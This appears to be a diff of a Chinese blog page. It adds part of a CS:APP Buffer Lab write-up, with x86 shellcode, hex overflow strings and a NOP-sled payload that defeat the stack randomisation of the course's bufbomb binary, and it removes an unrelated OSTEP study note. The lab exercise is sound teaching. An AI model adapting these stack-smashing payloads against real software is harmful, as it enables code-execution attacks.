+<li>程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行</li>
+</ol>
+<p>下面我们讨论一下攻击代码中具体的细节。</p>
+<p>首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。<br>栈上的返回地址和阶段2一样，为0x55682f58。</p>
+<p>然后我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x8048dbe, %eax <span class="comment">;将真正的返回地址送入%eax</span></div><div class="line"><span class="keyword">mov</span> %eax, -<span class="number">0x2c</span>(%ebp) <span class="comment">;将%eax送入栈上的正确位置</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;修改返回值</span></div><div class="line"><span class="keyword">sub</span> <span class="number">$4</span>, %esp <span class="comment">;修改栈顶%esp</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
+<p>这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">08048<span class="keyword">daa</span> &lt;<span class="keyword">test</span>&gt;:</div><div class="line"> 8048<span class="keyword">daa</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048dab:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048dad:       <span class="number">53</span>                      <span class="keyword">push</span>   %ebx</div><div class="line"> 8048dae:       <span class="number">83</span> ec <span class="number">24</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048db1:       e8 da ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048db6:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    %eax,-<span class="number">0xc</span>(%ebp)</div><div class="line"> 8048db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   80491f4 &lt;getbuf&gt;</div><div class="line"> 8048dbe:       <span class="number">89</span> c3                   <span class="keyword">mov</span>    %eax,%ebx</div><div class="line"> 8048dc0:       e8 cb ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048dc5:       8b <span class="number">55</span> f4                <span class="keyword">mov</span>    -<span class="number">0xc</span>(%ebp),%edx</div><div class="line"> 8048dc8:       <span class="number">39</span> d0                   <span class="keyword">cmp</span>    %edx,%eax</div><div class="line"> 8048dca:       <span class="number">74</span> 0e                   <span class="keyword">je</span>     8048dda &lt;<span class="keyword">test</span>+<span class="number">0x30</span>&gt;</div><div class="line"> 8048dcc:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">88</span> a3 <span class="number">04</span> <span class="number">08</span>    movl   <span class="number">$0</span>x804a388,(%esp)</div><div class="line"> 8048dd3:       e8 e8 fa ff ff          <span class="keyword">call</span>   80488c0 &lt;puts@plt&gt;</div><div class="line"> 8048dd8:       eb <span class="number">46</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048dda:       3b <span class="number">1d</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%ebx</div><div class="line"> 8048de0:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048e08 &lt;<span class="keyword">test</span>+<span class="number">0x5e</span>&gt;</div><div class="line"> 8048de2:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048de6:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> 2a a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a52a,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048ded:       <span class="number">08</span></div><div class="line"> 8048dee:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048df5:       e8 c6 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048dfa:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x3,(%esp)</div><div class="line"> 8048e01:       e8 <span class="number">75</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048e06:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048e08:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048e0c:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">47</span> a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a547,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048e13:       <span class="number">08</span></div><div class="line"> 8048e14:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048e1b:       e8 a0 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048e20:       <span class="number">83</span> c4 <span class="number">24</span>                <span class="keyword">add</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048e23:       5b                      <span class="keyword">pop</span>    %ebx</div><div class="line"> 8048e24:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %ebp</div><div class="line"> 8048e25:       c3                      <span class="keyword">ret</span>    </div></pre></td></tr></table></figure></p>
+<p>我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。</p>
+<p>而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。</p>
+<p>下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */</div><div class="line">b8 be 8d 04 08 89 45 d4 /* 攻击代码 */</div><div class="line">b8 4c 92 de 3d 83 ec 04</div><div class="line">c3</div></pre></td></tr></table></figure></p>
+<p>最后我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<p>阶段3完成。</p>
+<h4 id="攻击代码的优化"><a href="#攻击代码的优化" class="headerlink" title="攻击代码的优化"></a>攻击代码的优化</h4><p>注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。</p>
+<p>其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c,%eax <span class="comment">;返回值</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x55682f80,%ebp <span class="comment">;修改%ebp</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048dbe <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
+<p>根据以上的信息重新生成我们的攻击代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/</div><div class="line">b8 4c 92 de 3d bd 80 2f /* 攻击代码 */</div><div class="line">68 55 68 be 8d 04 08 c3</div></pre></td></tr></table></figure></p>
+<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<h3 id="阶段4：硝化甘油（Nitroglycerin）"><a href="#阶段4：硝化甘油（Nitroglycerin）" class="headerlink" title="阶段4：硝化甘油（Nitroglycerin）"></a>阶段4：硝化甘油（Nitroglycerin）</h3><blockquote>
+<p>需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段</p>
+</blockquote>
+<p>本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。</p>
+<p>具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。</p>
+<p>若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。</p>
+<p>在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。</p>
+<p>首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。</p>
+<p>我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。</p>
+<p>具体的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span> <span class="number">0x28</span>(%esp), %ebp <span class="comment">;复原%ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;设置cookie</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048e3a <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
+<p>注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。</p>
+<p>最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。</p>
+<p>最终我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24</div><div class="line">28 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */</div></pre></td></tr></table></figure></p>
+<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<p>阶段4完成。</p>
+<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。</p>
+<p>除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。</p>
+
+                    
+                        
+
+                    
+                    
+                        <p>
+                            <a href="/2017/05/16/深入理解计算机系统BufferLab实验报告/#post-footer" class="postShorten-excerpt_link link">
+                                评论和共享
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title" itemprop="headline">
+                    
                         <a class="link-unstyled" href="/2017/05/12/迁移说明/">
                             迁移说明
                         </a>
@@ -1807,162 +1975,6 @@
         
     </article>
     
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title" itemprop="headline">
-                    
-                        <a class="link-unstyled" href="/2016/12/12/OSTEP学习笔记1/">
-                            OSTEP学习笔记1
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time itemprop="datePublished" datetime="2016-12-12T22:54:45+08:00">
-	
-		    12月 12, 2016
-    	
-    </time>
-    
-        <span>发布在 </span>
-        
-    <a class="category-link" href="/categories/操作系统/">操作系统</a>
-
-
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content" itemprop="articleBody">
-                    <blockquote>
-<p>最近开始看Operating Systems: Three Easy Pieces这本书，感觉光看书还是不够，还是需要将学习到的东西整理和归纳，以加深自己对于操作系统的理解。</p>
-</blockquote>
-<h2 id="CPU的虚拟化"><a href="#CPU的虚拟化" class="headerlink" title="CPU的虚拟化"></a>CPU的虚拟化</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>进程(Process)是操作系统对于一个正在运行的程序的抽象</p>
-<h4 id="进程API"><a href="#进程API" class="headerlink" title="进程API"></a>进程API</h4><p>大体上可以分为创建(Create)，销毁(Destroy)，等待(Wait)，杂项控制(Miscellaneous Control)包括挂起等以及状态查询(Status)。</p>
-<h5 id="Unix下的进程API"><a href="#Unix下的进程API" class="headerlink" title="Unix下的进程API"></a>Unix下的进程API</h5><p>fork() wait() 以及 exec()</p>
-<h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p>进程的状态大体上可以分为运行(Running)，就绪(Ready)以及阻塞(Blocked)。</p>
-<ul>
-<li>运行(Running)，进程正在被处理器运行，这意味着，处理器正在执行指令。</li>
-<li>就绪(Ready)，进程已经准备好去运行，但是出于某种原因，操作系统决定不在当前的时刻运行该进程。</li>
-<li>阻塞(Blocked)，在阻塞状态，进程已经执行了某种其他的操作以至于在该操作完成前该进程不能就绪，如：进程对于磁盘的IO请求。</li>
-</ul>
-<h4 id="进程表"><a href="#进程表" class="headerlink" title="进程表"></a>进程表</h4><p>操作系统通常会使用进程表管理所有的进程，包括追踪每一个进程的寄存器，起始内存，内存大小，PID，父进程，已打开的文件，进程状态等。</p>
-<h3 id="机制-Limited-Direct-Execution-LDE"><a href="#机制-Limited-Direct-Execution-LDE" class="headerlink" title="机制:Limited Direct Execution(LDE)"></a>机制:Limited Direct Execution(LDE)</h3><p>直接执行即系统直接将进程运行在CPU上以最大化效率，限制即不能直接让进程取得对硬件以及系统所有的控制。</p>
-<h4 id="限制操作"><a href="#限制操作" class="headerlink" title="限制操作"></a>限制操作</h4><p>当进程需要执行IO请求等限制操作时，不应该使得进程获得整个操作系统的控制权限。因此引入了Protected Control Transfer的概念。</p>
-<h5 id="Protected-Control-Transfer"><a href="#Protected-Control-Transfer" class="headerlink" title="Protected Control Transfer"></a>Protected Control Transfer</h5><p>引入两种处理器模式：<strong>User Mode</strong>和<strong>Kernal Mode</strong></p>
-<ul>
-<li>User Mode - 在User Mode下，运行在该模式下的代码受到了严格的限制。比如，在该模式下，进程无法发起IO请求，并且也无法执行所有的限制指令。</li>
-<li>Kernal Mode - 在Kernal Mode下，由操作系统执行指令，执行的指令没有任何限制，包括IO请求以及所有的限制指令都可以被执行。</li>
-</ul>
-<p><strong>System Call</strong> - 用户程序通过执行System Call去执行限制指令如访问文件系统，与其他进程通信或是分配内存。<br>为了执行System Call，用户程序需要执行一个特殊的Trap指令，Trap指令同时地跳转至内核并且提升至Kernal Mode，一旦进入了内核，系统就可以执行任何限制指令，并且完成调用进程需要完成的任务。完成后，系统调用一个特殊的Return-From-Trap指令，跳转回用户程序并且降低至User Mode。</p>
-<blockquote>
-<p>在执行Trap指令时，系统需要额外的开销以保证执行Return-From-Trap指令时跳转正确，例如，在x86下，系统会将PC及其他几个寄存器存入每个进程的内核栈。</p>
-</blockquote>
-<p>此外，内核需要在引导时建立<strong>Trap Table</strong>以保证用户程序程序执行Trap指令后能跳转至对应的指令。操作系统通知硬件<strong>Trap Handlers</strong>的位置，通知之后，直到下次引导之前，硬件都会知道对应handlers的位置，这样，当System Call或是其他异常被抛出时，硬件能对应作出正确的反应。</p>
-<blockquote>
-<p>显然，建立Trap Table的指令也是限制指令。</p>
-</blockquote>
-<h4 id="进程间切换"><a href="#进程间切换" class="headerlink" title="进程间切换"></a>进程间切换</h4><p>进程的切换需要操作系统的介入，但是当用户程序在CPU上执行时，操作系统并不在运行，那么，操作系统要如何重新获得对CPU的控制呢？</p>
-<h5 id="合作方法：等待System-Calls"><a href="#合作方法：等待System-Calls" class="headerlink" title="合作方法：等待System Calls"></a>合作方法：等待System Calls</h5><p>在这种方法下，操作系统相信系统进程能正确的执行，长时间运行的进程理应周期性的放弃CPU，从而操作系统能决定运行其他的任务。</p>
-<p>大多数进程通过发起System Calls的方法转移CPU的控制权 - 在发起System Call，执行了Trap指令后，操作系统就获得了CPU的控制权。</p>
-<blockquote>
-<p>那么，当程序错误的执行死循环之后，操作系统还能拿到CPU的控制权吗？</p>
-</blockquote>
-<h5 id="非合作方法：系统直接控制CPU"><a href="#非合作方法：系统直接控制CPU" class="headerlink" title="非合作方法：系统直接控制CPU"></a>非合作方法：系统直接控制CPU</h5><p><strong>Timer Interrupt</strong> - 通过对定时器装置编程使得其每隔特定的时间（通常是毫秒级）发起中断。在这种情况下，当前执行的进程会被停止，并且操作系统中一个预先配置的<strong>Interrupt Handler</strong>会被执行，这样，操作系统就重新取得了对CPU的控制。</p>
-<h5 id="保存和恢复上下文"><a href="#保存和恢复上下文" class="headerlink" title="保存和恢复上下文"></a>保存和恢复上下文</h5><p>通常，当系统决定切换进程时，操作系统会执行一段底层代码(<strong>Context Switch</strong>)。从概念上来说，Context Switch会保存当前进程的若干寄存器的值，并且恢复待执行的进程的寄存器的值（例如，从内核栈中），这样，当Return-From-Trap指令执行时，系统得以恢复另一个进程的运行。</p>
-<p>在Timer Interrupt的LDE Protocal中（例如），存在着两种类型的寄存器保存／恢复，在中断产生时，由硬件隐式的将寄存器的值存入当前进程的内核栈中，而在操作系统决定从当前进程切换至待执行进程时，由软件（操作系统）显式的将当前进程的寄存器的值（如PC，栈指针）存入当前进程的进程结构中（例如，进程控制块），并且从带切换进程的进程结构中恢复对应寄存器的值，这样，当执行Return-From-Trap指令后，由硬件隐式的从切换进程的内核栈中恢复寄存器的值，就好像刚才的Trap是由切换后进程执行的一样。</p>
-<h4 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h4><blockquote>
-<p>如果当一个System Call被发起时，发生了一个Timer Interrupt怎么办？</p>
-</blockquote>
-<p>简单的做法是，在处理中断时，禁止其他中断的传入。更加复杂的机制留至并发行部分讨论。</p>
-<h3 id="调度器"><a href="#调度器" class="headerlink" title="调度器"></a>调度器</h3><h5 id="负载假设"><a href="#负载假设" class="headerlink" title="负载假设"></a>负载假设</h5><p>将正在运行在系统上的进程称为负载。为了简化调度过程，首先做出如下的假设：</p>
-<ul>
-<li>每一个任务(<strong>Job</strong>)运行同样的时间</li>
-<li>所有的任务都在同样的时间到达</li>
-<li>所有的任务都仅使用CPU(不执行I/O)</li>
-<li>每一个任务的运行时间都已知</li>
-</ul>
-<p>我们会在稍后的讨论中放宽这些限制</p>
-<h5 id="调度指标"><a href="#调度指标" class="headerlink" title="调度指标"></a>调度指标</h5><p>我们用调度指标衡量调度器的好坏，我们将使用以下两个指标：</p>
-<ul>
-<li>周转时间(<strong>Turnaround Time</strong>) 周转时间是指完成时间与到达时间的差，周转时间是衡量性能性能的指标。</li>
-<li>响应时间(<strong>Response Time</strong>) 响应时间是指任务第一次运行的时间与到达时间的差，响应时间是衡量公平性的指标。</li>
-</ul>
-<h4 id="先进先出-First-In-First-Out"><a href="#先进先出-First-In-First-Out" class="headerlink" title="先进先出(First In First Out)"></a>先进先出(First In First Out)</h4><p>该调度方法有时又被称作<strong>先到先得</strong>(<strong>First Come First Served</strong>)，即先到达的方法先被CPU运行。</p>
-<p>假设有3个任务，每个任务都运行10s，那么它们的平均周转时间为(10+20+30)/3=20s<br>下面我们放宽假设1，即现在每一个任务运行的时间不必相同。</p>
-<p>同样地，假设有3个任务，A运行100s而B和C运行10s，如果A先运行，然后运行B，最后运行C，那么现在的平均周转时间为(100+110+120)/3=110s，这就是<strong>护送效应</strong>(<strong>Convoy Effect</strong>)，即由于A的运行时间过长，而导致运行时间较短的B和C需要等待较长的时间。</p>
-<p>提出如下的新规则——</p>
-<h4 id="最短任务优先-Shortest-Job-First"><a href="#最短任务优先-Shortest-Job-First" class="headerlink" title="最短任务优先(Shortest Job First)"></a>最短任务优先(Shortest Job First)</h4><p>为此，我们提出一种新的规则称为最短任务优先，该规则同样易于理解，即首先执行最短的任务，然后次短的任务，以此类推。</p>
-<p>同样地假设A、B、C三个任务，其中A运行100s，而B和C运行10s，在SJF下，系统会先运行B和C，再运行A，平均周转时间为(10+20+120)/3=50s，远好于FIFO下相同假设的结果。</p>
-<p>下面我们放宽假设2，即每一个任务有可能在任意时间到达。</p>
-<p>假设A、B、C三个任务，其中A运行100s，在0s时到达，B和C运行10s，在10s时到达，在SJF下，平均周转时间为(100+(110-10)+(120-10))/3=103.33s，这是我们不愿意看到的结果，我们仍然需要改进调度算法——</p>
-<h4 id="最短完成时间优先-Shortest-Time-to-Completion-First"><a href="#最短完成时间优先-Shortest-Time-to-Completion-First" class="headerlink" title="最短完成时间优先(Shortest Time-to-Completion First)"></a>最短完成时间优先(Shortest Time-to-Completion First)</h4><p>SJF是一种<strong>非抢占</strong>(<strong>Non-preemptive</strong>)的调度器，而STCF是一种允许抢占的调度器，在上述的例子中，当B或者C到达时，调度器允许B或者C抢占A——即操作系统从任务A切换至任务B或者任务C（通过上下文切换），从而达到提升性能的目的。</p>
-<p>在上例中，若采用STCF，平均周转时间为((120-0)+(20-10)+(30-10))/3=50s，远好于103.33s这一结果。</p>
-<p>事实上，如果任务长度已知，任务仅使用CPU资源，且周转时间是唯一指标的话，STCF是最佳的调度算法，下面我们来讨论另一个指标——响应时间。</p>
